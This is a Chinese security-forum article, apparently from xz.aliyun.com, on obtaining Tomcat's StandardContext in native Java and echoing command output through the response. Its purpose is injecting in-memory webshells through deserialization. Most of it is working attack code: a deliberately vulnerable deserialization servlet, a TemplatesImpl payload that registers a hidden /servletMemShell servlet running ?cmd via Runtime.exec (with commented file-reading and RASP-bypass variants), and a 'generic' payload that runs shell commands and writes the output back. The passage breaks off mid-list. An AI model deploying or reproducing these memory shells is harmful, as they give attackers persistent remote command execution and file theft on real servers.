# Tomcat下java原生环境获取StandardContext的办法-先知社区

> **来源**: https://xz.aliyun.com/news/17059  
> **文章ID**: 17059

---

2025凑一下2020年的热闹，本文将介绍Tomcat环境下获取StandardContext的办法，以及直接写response回显的方法

本文会copy很多师傅们的见解，一个大总结，虽然并没有什么新东西（！

# Tomcat下获取StandardContext的办法

在学习内存马的时候看到很多都是jsp的马，在java环境下如何使用？在Tomcat环境下，jsp有tomcat catalina自带的org.apache.catalina.connector.RequestFacade类，直接用request即可得到该内置对象。在java原生环境中获取能用的Request就要麻烦印第安

## 对Tomcat下三个Context的理解

Tomcat中这三个StandardContext、ApplicationContext、ServletContext都是干什么的？

* ServletContext：ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等
* ApplicationContext：在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看[这篇文章](https://www.runoob.com/w3cnote/facade-pattern-3.html)，简单来讲就是加一层包装。

其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等

* StandardContext：StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。

## Tomcat jsp获取StandardContext

### 方法1

在Tomcat环境下，jsp有tomcat catalina自带的org.apache.catalina.connector.RequestFacade类，直接用request即可得到该内置对象。通过反射即可获取StandardContext

![](images/20250307110554-1526075d-fb01-1.png)

```
ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) request.getServletContext();
    Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
```

request.getSession().getServletContext()其实结果和request.getServletContext结果一样

![](images/20250307110557-1728899d-fb01-1.png)

所以第一句可以改为如下

ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) request.getSession().getServletContext();

### 方法2

```
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext standardContext = (StandardContext) req.getContext();
```

同样随便找个jsp打上断点，org.apache.catalina.connector.Request#getContext如下，从mappingData中返回context

![](images/20250307110558-179745cb-fb01-1.png)

jsp自带的Request.request已经装填好了mappingData

![](images/20250307110558-1810a977-fb01-1.png)

这里JSP内置对象request其实是RequestFacade，封装了Request

![](images/20250307110559-18a056e5-fb01-1.png)

## Tomcat Java获取StandardContext

### 方法1

Tomcat的类加载机制并不是传统的双亲委派机制，因为**传统的双亲委派机制并不适用于多个Web App的情况。**

假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。**这个定制的ClassLoader就是WebappClassLoader。**

那么如何破坏Java原有的类加载机制呢？如果上层的ClassLoader需要调用下层的ClassLoader怎么办呢？就需要**使用\***\*Thread Context ClassLoader，线程上下文类加载器\*\*。Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器，如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。

说了那么多，其实**WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。**

Thread.currentThread().getContextClassLoader()可以取出当前Tomcat请求的线程对应的ContextClassLoader()

```
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();

System.out.println(standardContext);
```

![](images/20250307110600-190e8df8-fb01-1.png)

其resources下有StandardContext

![](images/20250307110601-19825afa-fb01-1.png)

在多线程环境中，每个线程可以有自己的类加载器。

这种做法的**限制在于只可用于Tomcat 8 9**

WebappclassLoader 的 getResources()方法，早在 8.5.78 的版本就被标为了@Deprecated，直接就 return null 了，然后在 10.x 版本就直接移除了该方法。不过在8高版本和9的情况下，仍能直接通过反射获取resources

```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
```

### 方法2

这个思路来自kingkk师傅的《Tomcat中一种半通用回显方法》

兼容Tomcat 7,8,9，在Tomcat6下无法使用，Shiro下无法使用

* ThreadLocal：

在 java 中有一个问题被经常提起：线程安全的问题。这里所说的安全不是代码执行或者数据泄露那种安全，它是影响整个业务处理结果，以及处理效率的一个问题，属于开发的范畴。web 服务就是一个特别显著的例子，当我们服务器接收大量的请求时，后台的某一个关键变量，比如某一商品的货存量，有 n 个客户同时请求它的购买，并且每个客户购买的数量都不同。并且此后同时支付的现金，此时 n 个线程开始同时进行，货物数量的值是共享。

此时会因为没有线程隔离以及线程保护，导致每个客户都购买了相同数量的货物，并不是自己想要的货物。

如何解决这个问题呢？

ThreadLocal 就是用来解决这个问题的，它的作用就是在多线程请求的情况下，维护好每一个单一线程的变量，避免因多线程操作而导致共享数据不一致的情况。

Tomcat接收到一个普通请求的栈帧如下：

![](images/20250307110602-1a02c9d2-fb01-1.png)

把目光锁定到org.apache.catalina.core.ApplicationFilterChain#internalDoFilter

首先，ApplicationFilterChain有lastServicedRequest和lastServicedResponse变量，都是ThreadLocal类型，且分别为ServletRequest和ServletResponse

![](images/20250307110603-1aad6510-fb01-1.png)

internalDofIlter方法内，在执行完doFilter后，调用servlet.service前，如果ApplicationDispatcher.WRAP\_SAME\_OBJECT为true，则对lastServicedRequest和lastServicedResponse进行赋值

![](images/20250307110604-1b3d0ceb-fb01-1.png)

这里的赋值来自于internalDoFilter参数，看样子等同于jsp的内置对象request

![](images/20250307110605-1bdd0410-fb01-1.png)

于是有了利用思路：

1. 反射修改ApplicationDispatcher.WRAP\_SAME\_OBJECT为true，此时lastServicedRequest和lastServicedResponse有了值
2. 由于已经反射修改了WRAP\_SAME\_OBJECT，而if内的set是调用ThreadLocal.set()，肯定得先初始化lastServicedRequest和lastServicedResponse。代码可以直接copy ApplicationFilterChain static块

![](images/20250307110606-1c51681f-fb01-1.png)

1. 不管我们是在doFilter还是servlet.service处进行内存马利用，都需要先运行一遍internalDoFilter才能成功赋值。也就是需要访问两次对应servlet，一次反射赋值，一次取出request和response。而且lastServicedRequest和lastServicedResponse、WRAP\_SAME\_OBJECT都是final修饰，需要加一步反射。

上述利用存在两个个利用条件：

一是 JDK 在 17 版本之后不能够通过反射去修改 final 属性值。也就是在 Springboot3 或者 Spring6 这种内置要求 JDK17 版本之后的服务都不能通过这种方式打入内存马

二是 tomcat10.1.x 之后的版本（也就是 Springboot3 要求的版本），判断条件也发生了变化

所以利用场景限制于 Tomcat<10 ，JDK<17 的情况，具体一点就是 Springboot2，spring5，以及版本符合条件的 javaweb 环境等（高版本有高版本的方法，之后再写）

```
try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();
                ServletResponse servletResponse = threadLocalResp.get();
                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
                System.out.println(servletRequest);
            }

        }
```

显然threadLocalReq.get()取到的是RequestFacade，和jsp内置对象一样，就可以回到上面已有request继续利用

![](images/20250307110607-1cf357a9-fb01-1.png)

但是上面的方法有两个缺点：

1. 在调用ApplicationFilterChain类的internalDoFilter()函数时，调用到了Shiro的ShiroFilter过滤器类、其中会调用到CookieRememberMeManager类的getRememberedSerializedIdentity()函数来获取cookie内容并进行反序列化操作，这个过程都是还在调用应用的doFilter()的时候就触发了，而间于Filter Chain执行之后、调用Servlet实例之前的Request和Response的设置就不起作用了
2. 需要访问两次指定的servlet才能顺利打入内存马，问题是反序列化打TemplatesImpl一般都是只执行一次static块，如何访问两次servlet？

针对第一个问题，在方法3进行解答

针对第二个问题，我刚刚想到一个很简单的办法，虽然一个web应用程序下有好几个不同的servlet映射，但是它们都共用同一个ApplicationFilterChain和StandardContext，反序列化打一个接口同一个字节码两遍即可。

现在我构造一个用CC打入servlet马的例子：

一个有CC入口的漏洞环境：

```
@WebServlet("/Vuln")
public class vulnServlet  extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        byte[] bytes= Base64.getDecoder().decode(req.getParameter("data"));
        ByteArrayInputStream BAIS=new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream=new ObjectInputStream(BAIS);
        try
        {
            System.out.println(objectInputStream.readObject());
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

CC链自己肯定有，懒得贴了

之前复现是直接extends继承的HttpServlet，因为TemplatesImpl需要继承AbstractTranslet的原因，不能同时继承两个类，所以看下能不能替换HttpServlet

HttpServlet继承了GenericServlet

![](images/20250307110607-1d78efb9-fb01-1.png)

GenericServlet实现了Servlet，ServletConfig，Serializable接口

![](images/20250307110608-1dea14f4-fb01-1.png)

很明显，Servlet接口的service方法就是可以用来替换doGet、doPost的方法

![](images/20250307110609-1e7b36d6-fb01-1.png)

所以Java代码下，用kingkk师傅构造的从ApplicationFilterChain取resquest 的 servlet+TemplatesImpl code如下：

```
package org.example.tomcatmemshell.servlet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.*;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Enumeration;

public class ServletMemShell extends AbstractTranslet implements Servlet, ServletConfig, java.io.Serializable{
    private String message;

    static {
        try {
            //获取StandardContext
//            StandardContext standardContext = getStandardContext1();
            StandardContext standardContext = getStandardContext2();
            if(standardContext != null){
                //自定义StandardWrapper注册进StandardContext
                ServletMemShell servletMemShell = new ServletMemShell();
                StandardWrapper standardWrapper = null;
                standardWrapper = (StandardWrapper) standardContext.createWrapper();
                standardWrapper.setName("servletMemShell");
                standardWrapper.setServletClass(servletMemShell.getClass().getName());
                standardWrapper.setServlet(servletMemShell);
                standardContext.addChild(standardWrapper);
                standardContext.addServletMappingDecoded("/servletMemShell", "servletMemShell");
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
//            Class<?> cls = null;
//            try {
//                cls = Class.forName("java.lang.UNIXProcess");
//            } catch (ClassNotFoundException e) {
//                throw new RuntimeException(e);
//            }
//            Constructor<?> constructor = cls.getDeclaredConstructors()[0];
//            constructor.setAccessible(true);
//            String[] command = {"/bin/sh", "-c", cmd};
//            byte[] prog = toCString(command[0]);
//            byte[] argBlock = getArgBlock(command);
//            int argc = argBlock.length;
//            int[] fds = {-1, -1, -1};
//            Object obj = null;
//            try {
//                obj = constructor.newInstance(prog, argBlock, argc, null, 0, null, fds, false);
//                Method method = cls.getDeclaredMethod("getInputStream");
//                method.setAccessible(true);
//                InputStream is = (InputStream) method.invoke(obj);
//                InputStreamReader isr = new InputStreamReader(is);
//                BufferedReader br = new BufferedReader(isr);
//                StringBuilder stringBuilder = new StringBuilder();
//                String line;
//                while ((line = br.readLine()) != null) {
//                    stringBuilder.append(line + '
');
//                }
//                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            } catch (InstantiationException | NoSuchMethodException | InvocationTargetException |
//                     IllegalAccessException e) {
//                throw new RuntimeException(e);
//            }
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

////读文件
//            File file = new File(cmd);
//            // 1. 确保文件存在且可读
//            if (!file.exists() || !file.isFile() || !file.canRead()) {
//                System.out.println("文件不存在或无法读取: " + cmd);
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在");
//                return;
//            }
//            // 2. 设置响应头，提供文件下载
//            HttpServletResponse response = (HttpServletResponse) servletResponse;
//            response.setContentType("application/octet-stream");
//            response.setHeader("Content-Disposition", "attachment; filename="" + file.getName() + """);
//            // 3. 读取文件并写入响应流
//            try (FileInputStream fis = new FileInputStream(file);
//                 OutputStream out = response.getOutputStream()) {
//                byte[] buffer = new byte[4096];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    out.write(buffer, 0, bytesRead);
//                }
//                out.flush();
//            } catch (IOException e) {
//                System.err.println("文件传输失败: " + e.getMessage());
//                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, "文件传输失败");
//            }

////读文件 ?cmd=file:///etc/passwd or 列目录 ?cmd=file:///
//            final URL url = new URL(cmd);
//            final BufferedReader in = new BufferedReader(new
//                    InputStreamReader(url.openStream()));
//            StringBuilder stringBuilder = new StringBuilder();
//            String line;
//            while ((line = in.readLine()) != null) {
//                stringBuilder.append(line + '
');
//            }
//            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
//            servletResponse.getOutputStream().flush();
//            servletResponse.getOutputStream().close();
//            return;

//RCE ?cmd=whoami
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '
');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    public void destroy() {
    }

    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public static StandardContext getStandardContext2() {
        try{
            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestfield.setAccessible(true);
            lastServicedResponsefield.setAccessible(true);
            //使用modifiersField修改属性值的final修饰
            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);

            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);


            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
                return null;

            }else{//第二次访问开始正式获取当前线程下的Req和Resp
                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
                ServletResponse servletResponse = threadLocalResp.get();

                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
                applicationContextFacadeField.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
                standardContextField.setAccessible(true);
                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

                System.out.println(servletRequest);
                return standardContext;
            }

        }
        catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }


    @Override
    public String getServletName() {
        return "";
    }

    @Override
    public ServletContext getServletContext() {
        return null;
    }

    @Override
    public String getInitParameter(String name) {
        return "";
    }

    @Override
    public Enumeration<String> getInitParameterNames() {
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

测试：

![](images/20250307110621-25ada59e-fb01-1.gif)

可以写servlet，那其他的jsp马，如Tomcat下valve、Listener、Filter都可以用上面的方法1，2改成java马使用

# Tomcat直接写Response 1（Tomcat半通用）

写到这里，你是否在想，通用到底是什么意思？

其实上面方法2写servlet内存马的部分都多余了，因为已经获取到了response，可以直接写回显内容，完全不需要多此一举去获取StandardContext写servlet、Filter等内存马。

通用的意思其实就是指：不用考虑servlet是否被占用，不用考虑Filter优先级低插入到后面了没应用上怎么办。因为根本就不用去注册组件进Tomcat

```
package org.example.tomcatmemshell.servlet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class GenericTomcatMemShell extends AbstractTranslet {
    static {
        try{
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");//以下几行为反射修改private static final变量的流程
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse =
                    (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);//获取实例
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);//同上
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);//同上
            String cmd = lastServicedRequest != null
                    ? lastServicedRequest.get().getParameter("cmd")
                    : null;//获取cmd参数的值
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());//赋值
                lastServicedResponseField.set(null, new ThreadLocal<>());//赋值
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//赋值
            } else if (cmd != null) {//回显内容
                ServletResponse responseFacade = lastServicedResponse.get();//获取当前请求response
                java.io.Writer w = responseFacade.getWriter();

                Field responseField = ResponseFacade.class.getDeclaredField("response");//修改usingwriter，让页面可以写正常内容以及命令回显
                responseField.setAccessible(true);
                Response response = (Response) responseField.get(responseFacade);
                Field usingWriter = Response.class.getDeclaredField("usingWriter");
                usingWriter.setAccessible(true);
                usingWriter.set(response, Boolean.FALSE);

                boolean isLinux = true;//执行命令
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\a");
                String output = s.hasNext() ? s.next() : "";
                w.write(output);
                w.flush();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

![](images/20250307110632-2beae43a-fb01-1.png)

# Tomcat直接写Response 2（Tomcat8,9,10通用）

由于上面的手法

这个思路来自Litch1师傅的《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》

适用于Tomcat 8,9,10，因为8以下不能调用getContextClassLoader()获取到StandardContext，但是可以用于shiro回显

从ApplicationFilterChain找request和response还是太深的调用栈了。

回想起这个图，ApplicationFilterChain都已经在尾巴上了

![](images/20250307110633-2cb6dee5-fb01-1.png)

从最开始的Http11Processor开始看起

其核心方法肯定是service()，在service()方法内，调用了getAdapter().service(request,response)，其中的参数request,response静态变量分别是Request和Response对象

![](images/20250307110634-2d63b5ff-fb01-1.png)

![](images/20250307110635-2de4f1c1-fb01-1.png)

如果能获取Request、Response，那参照上面JSP获取StandardContext的方法2

我草，直接在Http11Processor反射取request和response字段的值不就完了，那怎么获取当前环境的Http11Processor呢？

request和response并不是Http11Processor的字段，而是其父类AbstractProcessor的字段

![](images/20250307110636-2e59c7c5-fb01-1.png)

找下看request和response在哪赋的值，栈里面可以看出在Http11Processor.service的上两帧，调用了AbstarctProtocol$ConnectionHandler#process

![](images/20250307110637-2ef95bc7-fb01-1.png)

在调用到AbstractProcessorLight之前，有两个processor == null的if块。第一个是从recycledProcessors出栈，也就是看看缓存表里是否已有Processor了；第二个if块内，也就是缓存表里没有Processor，就调用createProcessor()新建一个。

![](images/20250307110638-2fb15854-fb01-1.png)

变量里可以看出，这里创建的就是Http11Processor

![](images/20250307110639-304cf370-fb01-1.png)

至于为什么会进到AbstractProcessorLight#process，是因为Http11Processor的父类就是AbstractProcessor

![](images/20250307110640-30cae7f9-fb01-1.png)

在调用createProcessor()后，还调用到了register

![](images/20250307110641-31452b57-fb01-1.png)

重新打个断点调试一下，跟进register，可以看到从Http11processor里调用getRequest()获取到了请求对象，再调用getRequestProcessor()获取到了RequestInfo，具体中间怎么获取的不用管

![](images/20250307110642-31f1fbca-fb01-1.png)

然后调用了setGlobalProcessor，把global存进了上一步得到的RequestInfo

![](images/20250307110643-32c0f67e-fb01-1.png)

可以看到global其实就是一个包含了一堆RequestInfo的RequestGroupInfo

![](images/20250307110644-333d2c1c-fb01-1.png)

这个global里就包含了我们需要的request

因为global属于AbstractProctocol$ConnectionHandler，是内部类

![](images/20250307110645-33f15ec9-fb01-1.png)

查找一下，哪里调用了这个内部类的构造函数，找到AbstractHttp11Protocol构造函数吧内，实例化了ConnectionHandler，并调用setHandler存储

![](images/20250307110646-3490c3dd-fb01-1.png)

有setter就有getter，可以取出ConnectionHandler

![](images/20250307110647-352f5064-fb01-1.png)

AbstractHttp11Protocol是个抽象类，肯定要找其实现类去获取：

![](images/20250307110648-35a6baee-fb01-1.png)

不过能用的（不是抽象类）有点小多

![](images/20250307110649-3622a7ab-fb01-1.png)

正常的Java应用都用的Http11NioProtocol

然后天才师傅想到，从Http11Processor这个connector，转交到Engine的中间，也就是Http11Processor的后面一步，CoyoteAdapter.service中，涉及了一堆从connector变量中取出request和response的操作，那肯定跟上步的Http11NioProtocol有关系

![](images/20250307110650-36a703cd-fb01-1.png)

![](images/20250307110651-3748579b-fb01-1.png)

这个connector，和上面分析AbstractHttp11Protocol什么联系？

Connector类中有protocolHandler字段

![](images/20250307110652-37cb0fbf-fb01-1.png)

分析Http11NioProtocol，也实现了ProtocolHandler接口，那大概率这个字段就是其子类Http11NioProtocol

![](images/20250307110653-38558897-fb01-1.png)

查看变量信息即可验证

![](images/20250307110654-39054386-fb01-1.png)

梳理一下思路：

1. CoyoteAdapter内有connector变量，connector内部有protocolHandler字段，存储着Http11NioProtocol
